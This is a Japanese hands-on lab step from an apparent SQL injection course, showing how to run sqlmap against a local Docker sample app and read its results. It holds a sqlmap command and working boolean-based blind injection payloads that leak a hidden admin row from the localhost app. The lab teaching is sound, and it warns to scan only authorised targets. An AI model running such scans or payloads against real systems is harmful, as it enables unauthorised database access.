# step3 - sqlmapを触る
## このステップのゴール
- sqlmapを実行して、結果を得ることができること

## 注意
- DBに直接アクセスすると簡単に答えが分かりますが、一旦それはナシでお願いします :bow:

## はじめに
対象のアプリケーションに脆弱性があることを示すために、よく使われる診断方法は2つあります。脆弱性診断とペネトレーションテストです。前者は広く浅く、後者は深く狭く診断するイメージを持っていただくと良いと思います。

このペネトレーションテストで利用される1つのツールが、オープンソースの[sqlmap](https://github.com/sqlmapproject/sqlmap)です。sqlmapはSQL Injectionの脆弱性の検出等が可能なツールです。詳しくは公式のREADMEをご覧ください([ref](https://github.com/sqlmapproject/sqlmap#readme))。日本語訳もあります([ref](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ja-JP.md))

このツールは許可を受けた対象リソースに対して使用してください。なぜなら、内部的に検査対象のリソースに負荷をかけるリクエストを送るためです。深く考えずに実行すると対象リソースへの攻撃とみなされ、最悪訴えられることもあるため、注意してください。

## 手順

### 1. sqlmapのクローン

sqlmapのコードをクローンしてください。

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --help
```

### 2. sqlmapの実行

サンプルアプリケーションに対してsqlmapを実行してみましょう。まずはサンプルアプリケーションを実行しましょう。`sqli-chal/step3/`にいることを確認してください。

```bash
docker compose up
```

次に、sqlmapを実行してみます。sqlmapをクローンしたディレクトリに移動して、オプションを確認しましょう。

オプションは [lib/parse/cmdline.py#L114-859](https://github.com/sqlmapproject/sqlmap/blob/master/lib/parse/cmdline.py#L114-L859)で確認できます。今回は、この中から、今回の講義で利用する主要なオプションだけ抜粋します。他にもオプションはあるので各自読んでください。

|コマンドオプション|設定例|説明|
|:-:|:-:|:-:|
|`-u URL, --url=URL`|`-u "http://www.site.com/vuln.php?id=1"`|検査対象のURL|
|`-p テストパラメータ`|`-p id`|テストしたいパラメータ|
|`--dbms=データベース管理システム名(DBMS)`|`--dbms=sqlite`|検査対象のDBMS|
|`--level=レベル`|`--level=5`|実行するテストのレベル(1〜5の範囲で指定可能で、デフォルトは1)|
|`--risk=リスク`|`--risk=3`|実行するテストの危険性(1〜3の範囲で指定可能で、デフォルトは1)|
|`--flush-session`|`--flush-session`|過去にスキャンした結果を捨てて、新たにスキャンを実施する場合に付与するオプション|

これらのオプションを適切に設定して、実行してみましょう。例えば、以下のような実行オプションになるはずです。実行時に何か聞かれたら、一旦は全て `y` を回答すれば大丈夫です。

```bash
$ python3 sqlmap.py \
	-u "http://localhost:31555?name=test" \
    -p name \
    --risk=3 \
    --level=5 \
    --flush-session
```

### 3. sqlmapの実行

sqlmapを実行すると、次のような結果が得られるはずです。

```plaintext
Parameter: name (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: name=hoge' OR NOT 1728=1728-- mXRk
```

この結果のうち、boolean-basedの方に注目してみましょう。表にすると以下のような形になります。

|属性|値|
|:-:|:-:|
|Type|boolean-based blind|
|Title|OR boolean-based blind - WHERE or HAVING clause (NOT)|
|Payload|`name=hoge' OR NOT 1728=1728-- mXRk`|

このペイロードを含めた[http://localhost:31555/?name=hoge' OR NOT 1728=1728-- mXRk](http://localhost:31555/?name=hoge%27%20OR%20NOT%201728=1728--%20mXRk)にアクセスしてみましょう。すると、SQLインジェクションが成功していないことが分かります。この理由は検出ロジックについて触れる次の章で明らかになります。

※このURLの`?`以降に書く記法は、[MDNのドキュメント](https://developer.mozilla.org/ja/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#%E3%82%AF%E3%82%A8%E3%83%AA)をご覧ください。

---

正しく検出するには、[step3/app/app.py](./app/app.py)の13行目を`step2.db`に置き換えてから、以下コマンドでDockerコンテナを再起動する必要があります。

```bash
docker compose restart
```

その後、先ほどのsqlmapのコマンドを実行すると、次のような正しいboolean-based blindの結果が得られるはずです。

```plaintext
Parameter: name (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=-9901' OR 6151=6151-- FfuT
```

この結果から、`OR boolean-based blind`という攻撃の `WHERE` もしくは `HAVING` 句を利用した攻撃であることが分かります。更に、このペイロードを含めた[http://localhost:31555/?name=-9901' OR 6151=6151-- FfuT](http://localhost:31555/?name=-9901%27%20OR%206151=6151--%20FfuT)にアクセスしてみましょう。すると、SQLインジェクションが成功して、表示されている表の最後の行に`super_admin_314159`が表示されていることが分かります。

このペイロードは、step2で確認したペイロードとよく似てますね？OR条件で必ず成立するものを入れて、最後の条件を無視するようにしていたあのペイロードです。

では、次の[step4 - sqlmapの実装を読む](../step4/)では、このクエリをどのように検出しているか確認していきましょう。
